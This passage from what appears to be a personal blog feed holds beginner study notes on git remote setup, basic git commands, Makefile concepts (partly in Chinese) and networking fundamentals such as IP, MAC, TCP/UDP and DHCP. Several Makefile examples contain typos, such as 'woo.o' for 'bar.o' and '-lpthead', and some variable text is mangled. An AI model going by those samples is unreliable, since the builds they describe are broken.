log😜</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.09.01.png" /></p><p>Let me explain, this is a commit I made to demonstrate thecounterexample I mentioned. Actually, it should be that after git log,there’s nothing.</p><h3 id="solution">Solution:</h3><p>Just pull the initialization version of the remote repository, as thelocal base version, that’s what version control is about. git pull isvery descriptive</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.13.45.png" /></p><p>It prompts that this operation is unsuccessful because I have atest.txt file, and the first commit of the local repository is differentfrom the initial version of the remote repository, so it prompts meabout divergent branches, blah blah blah, as its prompt says, you canuse <code>git pull --rebase lixiang main</code></p><p>You might not know what this <code>--rebase</code> does, it’sactually branch merge commit, directly merging the remote repository andlocal repository regardless, and making one commit.</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.22.04.png" /></p><p>Success! Let’s check with git log……</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.23.03.png" /></p><p>It can be seen that the Initial commit of the remote repository hasbeen merged with my first local commit, but the remote and localrepositories are not synchronized at this time! Need to upload to theremote repository.</p><h3 id="step3-git-push">Step3: git push</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.28.42.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.29.24.png" /></p><p>Success, there’s a small issue that the branch has changed. Thereason here is that the default branch for local initialization ismaster, while the default branch for the remote repository is main. Butit’s not a big problem.</p><p>Command to modify default branch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global init.defaultBranch &lt;default branch name&gt;</span><br></pre></td></tr></table></figure><p>If you don’t understand the above process, it’s okay, I made itcomplicated, it should actually be simpler, no problem, let me write asimple version.</p><h2 id="simplification-of-the-second-method">Simplification of theSecond Method</h2><h3id="step1-create-remote-repository-and-initialize-local-repository">Step1:Create remote repository and initialize local repository</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.35.31.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.36.50.png" /></p><h3 id="step2-manually-establish-remote-connection">Step2: Manuallyestablish remote connection</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.43.25.png" /></p><h3id="step3-pull-git-pull-the-initial-version-of-the-remote-repository">Step3:Pull (git pull) the initial version of the remote repository</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.44.13.png" /></p><p>If you read my previous explanation, you’ll find that the<code>--rebase</code> parameter is not needed, because afterinitialization I did nothing, the commit record is empty, and an emptyrepository of course won’t produce any divergence when pulling anything.With an empty repository, there’s no such thing as merging!</p><p>Let’s check with git log</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.47.04.png" /></p><p>Exactly! The final step!😬</p><h3id="step4-after-creating-test-files-git-push-upload-to-remote-repository">Step4:After creating test files, git push upload to remote repository</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.01.png" /></p><p>Let’s check on GitHub</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.47.png" /></p><h2 id="summary">Summary</h2><p>I think what I said is just the tip of the iceberg, step-by-stepteaching how to connect local and remote repositories and commit filesyou want to upload. Actually, GitHub supports direct file upload, seethe <u>Add File</u> in the above image. I learned this without anyparticular purpose, just found it quite interesting. If you want tolearn more deeply, you can refer to my <ahref="https://hustlixiang21.github.io/2022/07/05/git入门/">previous blogpost</a></p><p>By the way, this article is basically all written by me, but Idefinitely read many, many other people’s viewpoints and kept makingmistakes myself, but that’s how learning works. I’ll attach a feworiginal articles I referenced here.</p><p><a href="https://zhuanlan.zhihu.com/p/359108193">Zhihu_Git Usage(Connecting Remote Repository)</a></p><p><ahref="https://blog.csdn.net/phily123/article/details/121160072">CSDN_DeleteRemote Repository Files</a></p><p><ahref="https://blog.csdn.net/A496608119/article/details/123566231">CSDN_GitLocal File Upload to Remote Repository</a></p><p><ahref="https://blog.csdn.net/u014630142/article/details/120261403">CSDN_DeleteGit Remote Repository Files</a></p><p>Take a careful look at what they wrote, it might be clearer than whatI wrote. My purpose is still to establish connections step by stepthrough my own understanding of the principles and processes. This canbe said to be my first blog post that’s also somewhat of a tutorial.Thanks for watching!</p>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Introduction</title>
      <link href="/2022/07/05/Tools/Git%20Introduction/"/>
      <url>/2022/07/05/Tools/Git%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="git-introduction">Git Introduction</h1><p>Based on Tsinghua University’s summer training for some hands-onpractice, referencing the book <ahref="https://git-scm.com/book/en/v2">Pro Git</a>.</p><p>Also recommend a <ahref="https://learngitbranching.js.org/?locale=zh_CN">quick startwebsite</a> that can better enhance understanding of branches.</p><span id="more"></span><h2 id="what-is-git">What is Git?</h2><p>Git is an open-source distributed version control system for agileand efficient project handling.</p><h3 id="version-control">Version Control</h3><p>Can easily restore things in the repository to the previous<strong>commit</strong>.</p><p>Principle: Uses snapshots for version control.</p><h3 id="distributed">Distributed</h3><p>My understanding is that multiple people on multiple hosts can workon the same development at different times and spaces without affectingeach other, and finally submit uniformly.</p><h2 id="basic-principles">Basic Principles</h2><p>Divided into working directory, staging area, and version library.There is a .git file in the folder, which contains the staging area andversion library, while the area outside .git is the workingdirectory.</p><figure><imgsrc="https://pic2.zhimg.com/80/v2-99d8bb59ba479252bfae5f71554b33aa_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="case-demonstration">Case Demonstration</h2><p>First, use the command line to enter the current folder.</p><p>Need to initialize the current folder to create an empty repository,using the command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pica.zhimg.com/80/v2-099c25239375be8b37a05910cbc07143_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Add the required files to the staging area:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>Commit files in the staging area to the version library:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit </span><br></pre></td></tr></table></figure><p>==At this time, the default editor will usually pop up, requiring adescription of this commit. Usually, unified standards are needed,written clearly and in detail.==</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-245d2877ae4fc8dfe9e8b64e3e8081e2_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="some-common-commands">Some Common Commands</h3><p>View commit logs:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-1025580221e635d84f2ebf13e632c0fe_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>View git status, i.e., files in the staging area.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic3.zhimg.com/80/v2-0edf6701fd8e886a2a037d0cc283edb9_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Compare <strong>working directory files</strong> with the last commitand output the differences.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><figure><imgsrc="https://picx.zhimg.com/80/v2-0c8cd096128899e7b95e084d974e0214_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="branches-and-remote-operations">Branches and RemoteOperations</h3><p>See the website tutorial at the beginning of the article, which isvivid and natural and impressive.</p>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile Introduction</title>
      <link href="/2022/06/20/Tools/Makefile%20Introduction/"/>
      <url>/2022/06/20/Tools/Makefile%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile-concept-introduction">Makefile ConceptIntroduction</h1><p><a href="https://zhuanlan.zhihu.com/p/29910215">Original ZhihuLink</a></p><p><a href="https://www.cnblogs.com/paul-617/p/15501875.html">BlogExplanation Link</a></p><p><ahref="https://blog.csdn.net/weixin_38391755/article/details/80380786">AnotherExplanation</a></p><p>This article mainly introduces how to use the “target-based layering”approach to understand a tool, write a concept, define a design, ordeploy a set of code.</p><p>This article is first a “Makefile Introduction”, and then a“Target-based Layering Method Introduction”.</p><span id="more"></span><h2 id="关于程序编译">关于程序编译</h2><p>Makefile解决的是编译的问题。Makefile最初是用来解决C语言的编译问题的，所以和C的关系特别密切，但并不是说Makefile只能用来解决C的编译问题。你用来处理Java一点问题没有，但对于Java，显然ant比Makefile处理得更好。</p><p>比如说，你有foo.c, bar.c,main.c三个C文件，你要编译成一个app.executable，你会怎么做呢？你会执行这样的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -c foo.c -o foo.o</span><br><span class="line">gcc -Wall -c bar.c -o bar.o</span><br><span class="line">gcc -Wall -c main.c -o main.o</span><br><span class="line">gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>按照程序猿的惯例，凡是要一次次重新执行的命令，都应该写成脚本。所以，简单来说，你会把上面这个命令序列写成一个build.sh，每次编译你只要执行这个脚本问题就解决了。</p><p>但这个脚本有问题，假设我修改了foo.c，但我没有修改bar.c和main.c，那么执行这个脚本是很浪费的，因为它会无条件也重新编译bar.c和main.c。</p><p>这个脚本更合理的写法应该是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ foo.o -ot foo.c ] &amp;&amp; gcc -Wall -c foo.c -o foo.o</span><br><span class="line">[ bar.o -ot bar.c ] &amp;&amp; gcc -Wall -c bar.c -o bar.o</span><br><span class="line">[ main.o -ot main.o] &amp;&amp; gcc -Wall -c main.c -o main.o</span><br><span class="line">[ app.executable -ot main.o ] &amp;&amp; [ app.executable -ot foo.o ] &amp;&amp; [ app.executable -ot bar.o ] &amp;&amp; gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>如果你面对一个问题，不要尝试重新去定义这个问题，而是看它和原来的问题相比，多出来的问题是什么，尝试解决那个多出来的问题就好了。那么这里，多出来的问题就是文件修改时间比较。这个就是Makefile要解决的基本问题了。我们定义一种新的“脚本语言”（只是不用sh/bash/tch来解释，而是用make来解释），可以用很简单的方法来说明我们需要做的文件比较。这样上面的脚本就可以写成这个样子了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample1</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  gcc -Wall -c foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  gcc -Wall -c bar.c -o woo.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  gcc -Wall -c main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>上面那个Makefile中，foo.o:foo.c定义了一个<strong>“依赖”</strong>，说明foo.o是靠foo.c编译成的，它后面缩进的那些命令，就是简单的shell脚本，称为<strong>规则(rule)</strong>。而Makefile的作用是定义一组依赖，当被依赖的文件比依赖的文件新，就执行规则。这样，前面的问题就解决了。</p><p>IDE中封装了Makefile得使用，但是想要具体控制特定文件的编译细节，最终仍然需要面对这些问题，IDE和make工具的对比，两者解决的是问题的不同层次。</p><p>Makefile中的依赖定义构成了一个依赖链（树），比如上面这个Makefile中，app.executable依赖于main.o，main.o又依赖于main.c，所以，当你去满足app.executable（这个目标）的依赖的时候，它首先去检查main.o的依赖，直到找到依赖树的叶子节点(main.c），然后进行时间比较。这个判断过程由make工具来完成，所以，和一般的脚本不一样。Makefile的执行过程不是基于语句顺序的，而是基于依赖链的顺序的。<imgsrc="https://pic4.zhimg.com/80/v2-90371e6fcdf8f515a68dab7404ed4f43_1440w.jpg"alt="依赖树" /></p><h2 id="phony依赖">phony依赖</h2><p>make命令执行的时候，后面跟一个“目标”（不带参数的话默认是第一个依赖的目标），然后以这个目标为根建立整个依赖树。依赖树的每个节点是一个文件，任何时候我们都可以通过比较每个依赖文件和被依赖文件的时间，以决定是否需要执行“规则”</p><p>但有时，我们希望某个规则<strong>总是被执行</strong>。这时，很自然地，我们会定义一下<strong>永远都不会被满足</strong>的依赖。</p><p>可能会这么写：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">test:</span></span><br><span class="line">  DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>test这个文件永远都不会被产生，所以，你只要执行这个依赖，rule是必然会被执行的。这种形式看起来很好用，但由于make工具默认认为你这是个文件，当它成为依赖链的一部分的时候，很容易造成各种误会和处理误差。</p><p>所以，简化起见，Makefile允许你显式地把一个依赖目标定义为<strong>假的(Phony)</strong>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: test</span></span><br><span class="line"><span class="section">test:</span></span><br><span class="line"> DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>这样make工具就不用多想了，也不用检查test这个文件的时间了，反正test就是假的，如果有人依赖它，无条件执行就对了。</p><h2 id="宏">宏</h2><p>前面的sample1明显还是有很多多余的成份，这些多余的成份可以简单通过引入“宏”定义来解决，比如上面的Makefile，我们把重复的东西都用宏来写，就成了这样了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample2</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> bar.c -o bar.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> main.o foo.o bar.o -o app.executable</span><br></pre></td></tr></table></figure><p>还是有“多余”的成份在，因为明明依赖中已经写了foo.o了，rule中还要再写一次，我们可以把依赖的对象定义为<spanclass="math inline">\(@，被依赖的对象定义为\)</span>^（这是当前gnumake的设计），这样就可以进一步化简：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample3</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>很明显，这还是有重复，我们可以把重复的定义写成通配符：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"><span class="section">woo.o: woo.c</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>实际上，你要化简，还有很多手段，比如gnumake其实是默认定义了一组rule的，上面这个整个你都可以不写，就这样就可以了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample5</span></span><br><span class="line">LDLIBS=-lpthead</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">OBJ=$(SRC:.c=.o)</span><br><span class="line"><span class="section">app.executable: <span class="variable">$(OBJ)</span></span></span><br><span class="line"><span class="comment">#看不懂</span></span><br></pre></td></tr></table></figure><p>这里其实没有定义.o到.c的依赖，但gnumake默认如果.c存在，.o就依赖对应的.c，而.o到.c的rule，是通过宏默认定义的。你只要修改CC，LDLIBS这类的宏，就能解决大部分问题了。所以你又省掉了一组定义，这就可以写得很短。</p><h2 id="头文件问题">头文件问题</h2><p>现在我们把问题搞得复杂一点，增加三个头文件。比如foo.h,bar.h和common.h，前两者定义foo.c和bar.c的对外接口，给main.c使用，common.h定义所有文件都要用到的通用定义（foo.h和woo.h中包含common.h)。这样前面这个sample1就有毛病了。照理说，foo.h更新的时候，foo.o和main.o都需要重新编译，但根据那个定义，根本就没有这个比较。</p><p>我们的定义必须写成这个样子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4+</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br><span class="line"><span class="section">bar.o: bar.c bar.h common.h</span></span><br><span class="line"><span class="section">main.o: main.c foo.h bar.h common.h</span></span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>(注：这个例子我们在.o.c依赖的规则中使用了$&lt;宏，它和$^的区别是，它不包括依赖列表中的所有文件，而仅仅是列表中的第一个文件）</p><p>这就又增加了复杂度了——头文件包含关系一变化，我就得更新这个Makefile的定义。这带来了升级时的冗余工作。按我们前面考虑一样的策略，我们尝试在已有的名称空间上解决这个问题。Makefile已经可以定义依赖了，但我们不知道这个依赖本身。这个事情谁能解决？——把这个过程想一下——其实已经有人解决这个问题了，这个包含关系谁知道嘛？当然是编译器。编译器都已经用到那个头文件了，当然是它才知道这种包含关系是什么样的。比如gcc本身直接就提供了-M系列参数，可以自动帮你生成依赖关系。比如你执行gcc-MM foo.c就可以得到</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br></pre></td></tr></table></figure><blockquote><p>本文引自开头的链接，由于能力有限及需求不高，剩余的看的不是很懂，目前就到这里。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning </tag>
            
            <tag> CS Tools </tag>
            
            <tag> Makefile Basics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Computer Network Fundamentals</title>
      <link href="/2022/06/13/Tools/Computer%20Network%20Fundamentals/"/>
      <url>/2022/06/13/Tools/Computer%20Network%20Fundamentals/</url>
      
        <content type="html"><![CDATA[<p>Note: This is all preliminary understanding, not in-depth. Willdiscuss more when we get to computer networks. # Basic Concepts ##Endpoints and Sessions An endpoint refers to a device on the networkthat can send or receive data. Communication between two endpoints iscalled a conversation. ## IP Address 32-bit binary number, commonlyrepresented in dotted decimal notation, changes as devices connect todifferent local area networks. Part consists of network number, anotherpart is host number, determined by subnet mask. ## Subnet Mask 32-bitbinary number, in the form of 1111…0000. Performing AND operation withIP address directly gives the network number, performing AND operationwith inverted mask and IP address gives the host number. ## MAC Address48-bit binary number Unique identifier for each host (constant afterleaving factory), physical address of network card, has mappingrelationship with IP address in local area network. Network carddirectly determines whether to send to operating system by comparing thetarget MAC address in data packets.</p><p><strong>The relationship between IP and MAC is similar to mailingaddress and ID number - mailing address may change, but ID number neverchanges.</strong></p><span id="more"></span><h2id="question-why-do-we-need-mac-addresses-when-we-have-ip-addresses">Question:Why do we need MAC addresses when we have IP addresses?</h2><p>IP address is equivalent to the recipient address on a package. Thecourier connects a line from origin to destination through the recipientaddress, then delivers the package to the recipient through logisticstransfers between different regions. MAC address is equivalent to therecipient name on a package. MAC address exists more for confirming theother party’s information. Just like when a package crosses severalcities to reach you, the courier needs to confirm with you whether therecipient is correct before handing over the package. For example,students in the same class (abstracted as local area network) all knoweach other, so communication doesn’t need to rely on student numbers(abstracted as IP address here), just call names (MAC address)directly.</p><p>Although there are IP addresses, they don’t work in local areanetworks because ARP protocol (Address Resolution Protocol) is used fornetwork addressing, and in local area networks all hosts are visible toeach other. (Besides, IP addresses in local area networks are at mostused as criteria for hosts receiving packets to determine whether theyare the target host when unpacking during ARP broadcasts, thus choosingwhether to respond to ARP replies).</p><h2 id="gateway">Gateway</h2><p>A gateway is a “gateway” that connects one network to anothernetwork. It’s a network checkpoint. Examples include switches androuters. Gateway is also called network connector and protocolconverter. Default gateway implements network interconnection above thenetwork layer, it’s the most complex network interconnection device,only used for interconnecting networks with different high-levelprotocols. Gateway structure is similar to routers, the difference isthe interconnection layer. Gateways can be used for both WAN and LANinterconnection.</p><p>==Note: Due to historical reasons, many TCP/IP literature used tocall routers used at the network layer as gateways. Today many localarea networks use routers for network access, so gateway usually refersto the router’s IP== ## TCP and UDP ### UDP Internet protocol suitesupports a connectionless transport protocol called User DatagramProtocol (UDP). UDP provides applications with a method to sendencapsulated IP data packets without establishing a connection. RFC 768describes UDP. Internet transport layer has two main protocols thatcomplement each other. The connectionless one is UDP, which does almostnothing special except providing applications with data packet sendingfunctionality and allowing them to structure their own protocols atrequired levels. The <strong>connection-oriented</strong> one is TCP,which does almost everything.</p><h3 id="tcp-more-powerful-but-also-more-difficult">TCP (More powerfulbut also more difficult)</h3><p>Transmission Control Protocol (TCP) is a connection-oriented,reliable, byte-stream-based transport layer communication protocol,defined by IETF RFC 793. TCP is designed to adapt to layered protocolhierarchies that support multi-network applications. Paired processes inhost computers connected to different but interconnected computercommunication networks rely on TCP to provide reliable communicationservices. TCP assumes it can obtain simple, possibly unreliable datagramservices from lower-level protocols. In principle, TCP should be able tooperate over various communication systems from hard-wired connectionsto packet-switched or circuit-switched networks.</p><h4 id="connection-establishment-and-termination">ConnectionEstablishment and Termination</h4><p><strong>Connection Establishment:</strong> <imgsrc="https://pic2.zhimg.com/80/v2-58989b47296d51404a93456e33fb8bce_1440w.png"alt="image" /> <strong>Connection Termination:</strong> <imgsrc="https://pica.zhimg.com/80/v2-ef569f7a16193c4f5ec462900790a730_1440w.png"alt="image" /></p><h4 id="main-features">Main Features</h4><p>TCP is a wide area network-oriented communication protocol designedto provide a communication method between two communication endpointswith the following characteristics when communicating across multiplenetworks: * Stream-based approach; * Connection-oriented; * Reliablecommunication method; * Minimize system bandwidth overhead due toretransmission when network conditions are poor; * Communicationconnection maintenance is oriented to the two endpoints ofcommunication, without considering intermediate network segments andnodes.</p><p>To meet these characteristics of the TCP protocol, TCP protocol makesthe following provisions: ①Data fragmentation: Fragment user data at thesender, reassemble at the receiver, TCP determines fragment size andcontrols fragmentation and reassembly; ②Arrival confirmation: When thereceiver receives fragmented data, send a confirmation to the senderbased on the fragment data sequence number; ③Timeout retransmission: Thesender starts a timeout timer when sending fragments, if nocorresponding confirmation is received after the timer expires,retransmit the fragment; ④Sliding window: The receive buffer space sizeof each party in a TCP connection is fixed, the receiver only allows theother end to send data that the receiver buffer can accommodate, TCPprovides flow control based on sliding window to prevent faster hostsfrom causing buffer overflow in slower hosts; ⑤Out-of-order handling:TCP fragments transmitted as IP datagrams may arrive out of order, TCPwill reorder the received data and deliver the received data to theapplication layer in the correct order; ⑥Duplicate handling: TCPfragments transmitted as IP datagrams will have duplicates, the TCPreceiver must discard duplicate data; ⑦Data checksum: TCP maintainschecksums of its header and data, this is an end-to-end checksumdesigned to detect any changes in data during transmission. If thechecksum of a received fragment has errors, TCP will discard thisfragment and not confirm receipt of this segment, causing the peer totimeout and retransmit.</p><h3 id="simple-distinction">Simple Distinction</h3><p>Internet transport layer has two main protocols that complement eachother. The <strong>connectionless</strong> one is UDP, which does almostnothing special except providing applications with data packet sendingfunctionality and allowing them to structure their own protocols atrequired levels. The <strong>connection-oriented</strong> one is TCP,which does almost everything.</p><h2 id="dhcp-service">DHCP Service</h2><h3 id="dhcp-introduction">DHCP Introduction</h3><p><strong>DHCP</strong> (Dynamic Host Configuration Protocol) is alocal area network protocol. It refers to a server controlling a rangeof IP addresses, where client machines can automatically obtainserver-assigned IP addresses and subnet masks when logging into theserver. Usually applied in large local area network environments, itsmain function is to centrally manage and allocate IP addresses, enablinghosts in the network environment to dynamically obtain IP addresses,Gateway addresses, DNS server addresses and other information, andimprove address utilization.</p><p>DHCP protocol uses a client/server model, where dynamic host addressallocation tasks are driven by network hosts. When the DHCP serverreceives address application information from network hosts, it sendsrelevant address configuration information to network hosts to achievedynamic configuration of network host address information.</p><h3 id="dhcp-functions">DHCP Functions</h3><p>DHCP has the following functions: 1. Ensure that any IP address canonly be used by one DHCP client at the same time. 2. DHCP should be ableto assign permanent fixed IP addresses to users. 3. DHCP should be ableto coexist with hosts that obtain IP addresses by other methods (such ashosts with manually configured IP addresses). 4. DHCP servers shouldprovide services to existing BOOTP clients.</p><h3 id="address-allocation-methods">Address Allocation Methods</h3><p>DHCP has three mechanisms for allocating IP addresses: 1) AutomaticAllocation: DHCP server assigns a permanent IP address to the host. Oncethe DHCP client successfully leases an IP address from the DHCP serverfor the first time, it can use that address permanently. 2) DynamicAllocation: DHCP server assigns a time-limited IP address to the host.When the time expires or the host explicitly abandons the address, theaddress can be used by other hosts. 3) Manual Allocation: The client’sIP address is specified by the network administrator, and the DHCPserver only tells the client host the specified IP address. Among thethree address allocation methods, only dynamic allocation can reuseaddresses that clients no longer need.</p><h2 id="ftp">FTP</h2><h3 id="ftp-introduction">FTP Introduction</h3><p>File Transfer Protocol (FTP) is a set of standard protocols for filetransfer over networks. It works at the seventh layer of the OSI model,the fourth 